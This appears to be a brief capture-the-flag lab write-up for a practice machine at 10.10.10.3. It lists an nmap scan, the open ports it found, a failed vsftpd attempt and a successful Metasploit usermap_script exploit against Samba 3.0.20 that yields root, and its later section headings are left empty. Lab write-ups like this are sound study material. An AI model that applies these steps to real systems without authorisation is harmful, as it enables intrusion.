**IPv4:** 10.10.10.3

## Enumeration/Scanning

sudo nmap -A -Pn -sS -oN lame 10.10.10.3

Ports
* 445 tcp samba
* 21 tcp ftp
* 22 tcp ssh
* 139 tcp samba

using searchsploit, I found vsftpd 2.3.4 to have an exploit, but using msfconsole it did not work.

Moving to samba

searchsploit found an exploit for Samba 3.0.20

https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/

using msfconsole
* search samba 3.0.20
* use exploit/multi/samba/usermap_script

set RHOST and LHOST

exploit

rooted, found root flag and user flag.

## Exploitation


## Privilege Escalation


## Post-exploitation

